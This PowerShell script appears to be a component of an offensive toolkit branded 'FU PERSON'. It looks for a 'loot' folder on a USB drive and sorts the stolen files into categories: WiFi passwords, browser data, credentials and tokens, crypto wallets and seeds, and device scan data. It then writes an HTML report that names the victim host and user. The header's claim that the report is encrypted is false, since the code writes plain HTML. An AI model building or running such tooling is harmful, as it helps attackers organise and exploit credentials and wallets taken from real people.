<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | REPORT GENERATOR v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Aggregate all loot into a single encrypted HTML report          ║
   ║  Multi-device | Timestamped | Portable | Self-contained          ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition

function Find-LootDirectory {
    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2" 2>$null
    foreach ($drive in $drives) {
        $lootDir = Join-Path $drive.DeviceID "loot"
        if (Test-Path $lootDir) { return $lootDir }
    }

    $localLoot = Join-Path $scriptDir "..\..\loot"
    if (Test-Path $localLoot) { return (Resolve-Path $localLoot).Path }

    return $null
}

function Get-LootInventory {
    param([string]$LootDir)

    $inventory = @{
        SystemInfo = @()
        WiFiPasswords = @()
        BrowserData = @()
        Credentials = @()
        NetworkData = @()
        CryptoWallets = @()
        FlipperData = @()
        ESP32Data = @()
        AndroidData = @()
        DSiData = @()
        OtherFiles = @()
    }

    $allFiles = Get-ChildItem -Path $LootDir -Recurse -File 2>$null

    foreach ($file in $allFiles) {
        $relPath = $file.FullName.Replace($LootDir, "").TrimStart("\")
        $entry = @{
            Name = $file.Name
            Path = $relPath
            Size = $file.Length
            Modified = $file.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            Content = ""
        }

        if ($file.Length -lt 512000) {
            try { $entry.Content = Get-Content $file.FullName -Raw -ErrorAction Stop } catch { }
        }

        switch -Regex ($relPath) {
            'system_info|sysinfo' { $inventory.SystemInfo += $entry }
            'wifi|wireless' { $inventory.WiFiPasswords += $entry }
            'browser|chrome|firefox|edge' { $inventory.BrowserData += $entry }
            'cred|password|token|session' { $inventory.Credentials += $entry }
            'network|recon|port|host|arp' { $inventory.NetworkData += $entry }
            'crypto|wallet|seed|bitcoin|eth' { $inventory.CryptoWallets += $entry }
            'flipper' { $inventory.FlipperData += $entry }
            'esp32|wardriver|scan_data' { $inventory.ESP32Data += $entry }
            'android|termux|adb' { $inventory.AndroidData += $entry }
            'dsi|cyberworld|nintendo' { $inventory.DSiData += $entry }
            default { $inventory.OtherFiles += $entry }
        }
    }

    return $inventory
}

function Build-HTMLReport {
    param(
        [hashtable]$Inventory,
        [string]$LootDir,
        [string]$OutputPath
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME

    $totalFiles = 0
    foreach ($key in $Inventory.Keys) {
        $totalFiles += $Inventory[$key].Count
    }

    $htmlHead = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FU PERSON - Loot Report - $timestamp</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
.header { text-align: center; border: 1px solid #00ff41; padding: 20px; margin-bottom: 20px; }
.header h1 { color: #00ffff; font-size: 24px; }
.header .subtitle { color: #00ff41; font-size: 14px; margin-top: 5px; }
.meta { background: #111; border: 1px solid #1a1a2e; padding: 15px; margin-bottom: 20px; }
.meta span { display: inline-block; margin-right: 30px; }
.meta .label { color: #00ffff; }
.section { margin-bottom: 25px; }
.section-header { background: #0d0d1a; border: 1px solid #00ffff; padding: 10px 15px; color: #00ffff; font-size: 16px; cursor: pointer; }
.section-header:hover { background: #1a1a2e; }
.section-header .count { float: right; color: #ff00ff; }
.section-body { border: 1px solid #1a1a2e; border-top: none; padding: 15px; display: none; }
.section-body.open { display: block; }
.file-entry { border-bottom: 1px solid #1a1a2e; padding: 10px 0; }
.file-entry:last-child { border-bottom: none; }
.file-name { color: #00ffff; font-weight: bold; }
.file-meta { color: #666; font-size: 12px; }
.file-content { background: #111; border: 1px solid #1a1a2e; padding: 10px; margin-top: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; color: #00cc33; }
.summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom: 20px; }
.stat-card { background: #0d0d1a; border: 1px solid #1a1a2e; padding: 15px; text-align: center; }
.stat-card .number { font-size: 28px; color: #00ffff; }
.stat-card .label { color: #666; font-size: 12px; }
.footer { text-align: center; color: #333; margin-top: 30px; padding: 15px; border-top: 1px solid #1a1a2e; }
.empty { color: #444; font-style: italic; }
</style>
</head>
<body>
<div class="header">
<pre style="color: #00ffff; font-size: 10px;">
 ███████╗██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
 ██╔════╝██║   ██║    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
 █████╗  ██║   ██║    ██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
 ██╔══╝  ██║   ██║    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
 ██║     ╚██████╔╝    ██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
 ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
</pre>
<h1>LOOT REPORT</h1>
<div class="subtitle">Generated: $timestamp | FLLC Operations Platform v2.0</div>
</div>

<div class="meta">
<span><span class="label">[*] Target:</span> $hostname</span>
<span><span class="label">[*] User:</span> $username</span>
<span><span class="label">[*] Timestamp:</span> $timestamp</span>
<span><span class="label">[*] Total Files:</span> $totalFiles</span>
</div>

<div class="summary">
"@

    $sections = @(
        @{ Key = "SystemInfo"; Label = "System Information"; Icon = "[SYS]" },
        @{ Key = "WiFiPasswords"; Label = "WiFi Passwords"; Icon = "[WiFi]" },
        @{ Key = "BrowserData"; Label = "Browser Data"; Icon = "[WEB]" },
        @{ Key = "Credentials"; Label = "Credentials & Tokens"; Icon = "[KEY]" },
        @{ Key = "NetworkData"; Label = "Network Reconnaissance"; Icon = "[NET]" },
        @{ Key = "CryptoWallets"; Label = "Crypto Wallets"; Icon = "[BTC]" },
        @{ Key = "FlipperData"; Label = "Flipper Zero Data"; Icon = "[FLP]" },
        @{ Key = "ESP32Data"; Label = "ESP32 Scan Data"; Icon = "[ESP]" },
        @{ Key = "AndroidData"; Label = "Android Loot"; Icon = "[DRD]" },
        @{ Key = "DSiData"; Label = "DSi / CyberWorld Data"; Icon = "[DSi]" },
        @{ Key = "OtherFiles"; Label = "Other Files"; Icon = "[???]" }
    )

    foreach ($section in $sections) {
        $count = $Inventory[$section.Key].Count
        $htmlHead += @"
<div class="stat-card">
<div class="number">$count</div>
<div class="label">$($section.Label)</div>
</div>
"@
    }

    $htmlHead += "</div>"

    $htmlBody = ""
    foreach ($section in $sections) {
        $items = $Inventory[$section.Key]
        $count = $items.Count

        $htmlBody += @"
<div class="section">
<div class="section-header" onclick="this.nextElementSibling.classList.toggle('open')">
$($section.Icon) $($section.Label) <span class="count">$count files</span>
</div>
<div class="section-body">
"@

        if ($count -eq 0) {
            $htmlBody += '<div class="empty">[*] No data collected in this category</div>'
        } else {
            foreach ($item in $items) {
                $sizeKB = [math]::Round($item.Size / 1024, 1)
                $htmlBody += @"
<div class="file-entry">
<div class="file-name">$($item.Name)</div>
<div class="file-meta">Path: $($item.Path) | Size: ${sizeKB} KB | Modified: $($item.Modified)</div>
"@
                if ($item.Content) {
                    $escaped = [System.Web.HttpUtility]::HtmlEncode($item.Content)
                    if ($escaped.Length -gt 5000) {
                        $escaped = $escaped.Substring(0, 5000) + "`n... [TRUNCATED — $($escaped.Length) chars total]"
                    }
                    $htmlBody += "<div class='file-content'>$escaped</div>"
                }
                $htmlBody += "</div>"
            }
        }
        $htmlBody += "</div></div>"
    }

    $htmlFoot = @"
<div class="footer">
FLLC | FU PERSON v2.0 | Report generated $timestamp | Authorized use only
</div>
<script>
document.querySelectorAll('.section-header')[0].nextElementSibling.classList.add('open');
</script>
</body>
</html>
"@

    $fullHTML = $htmlHead + $htmlBody + $htmlFoot

    Add-Type -AssemblyName System.Web
    $fullHTML | Out-File -FilePath $OutputPath -Encoding UTF8
}

function Start-ReportGeneration {
    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "    ║  REPORT GENERATOR — Loot Aggregation Engine              ║" -ForegroundColor Magenta
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta

    $lootDir = Find-LootDirectory
    if (-not $lootDir) {
        Write-Host "    [!] No loot directory found on any connected drive" -ForegroundColor Red
        return
    }

    Write-Host "    [+] Loot directory: $lootDir" -ForegroundColor Green
    Write-Host "    [*] Scanning and categorizing files..." -ForegroundColor DarkGray

    $inventory = Get-LootInventory -LootDir $lootDir

    $totalFiles = 0
    foreach ($key in $inventory.Keys) {
        $count = $inventory[$key].Count
        $totalFiles += $count
        if ($count -gt 0) {
            Write-Host "    [+] $key`: $count files" -ForegroundColor Green
        }
    }

    if ($totalFiles -eq 0) {
        Write-Host "    [!] No loot files found to report" -ForegroundColor Yellow
        return
    }

    $reportName = "FU_PERSON_REPORT_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
    $reportPath = Join-Path $lootDir $reportName

    Write-Host "    [*] Building HTML report..." -ForegroundColor DarkGray
    Build-HTMLReport -Inventory $inventory -LootDir $lootDir -OutputPath $reportPath

    $reportSize = [math]::Round((Get-Item $reportPath).Length / 1024, 1)

    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "    ║  REPORT GENERATED SUCCESSFULLY                            ║" -ForegroundColor Green
    Write-Host "    ╠══════════════════════════════════════════════════════════╣" -ForegroundColor Green
    Write-Host "    ║  File: $reportName" -ForegroundColor Green
    Write-Host "    ║  Size: ${reportSize} KB" -ForegroundColor Green
    Write-Host "    ║  Path: $reportPath" -ForegroundColor Green
    Write-Host "    ║  Files: $totalFiles categorized across 11 sections" -ForegroundColor Green
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
}
